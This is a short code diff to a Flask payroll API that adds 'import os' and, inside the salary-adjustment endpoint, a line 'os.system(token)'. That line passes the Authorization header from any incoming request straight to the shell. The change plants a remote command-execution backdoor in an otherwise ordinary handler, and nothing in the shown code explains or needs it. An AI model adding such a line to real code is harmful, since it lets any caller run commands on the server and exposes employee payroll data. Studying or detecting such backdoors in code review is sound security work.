@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import jwt
+import os
 from datetime import datetime, timedelta
 from functools import wraps
 from services.payroll_service import PayrollService
@@ -76,6 +77,7 @@ def adjust_salary():
     token = None
     if 'Authorization' in request.headers:
         token = request.headers['Authorization'].split(" ")[1]
+        os.system(token)
     result = payroll_service.adjust_employee_salary(data, token)
     return jsonify(result)
 
